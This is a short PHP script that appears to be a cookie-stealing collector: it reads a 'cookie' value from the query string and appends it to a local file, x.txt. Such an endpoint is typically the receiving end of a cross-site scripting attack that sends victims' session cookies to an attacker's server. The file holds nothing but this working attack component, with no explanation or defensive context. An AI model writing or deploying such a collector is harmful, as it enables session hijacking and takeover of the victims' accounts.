<?php

if (isset($_GET["cookie"])) {
  $cookie = $_GET["cookie"];
  file_put_contents("x.txt", $cookie."\n", FILE_APPEND);
}

?>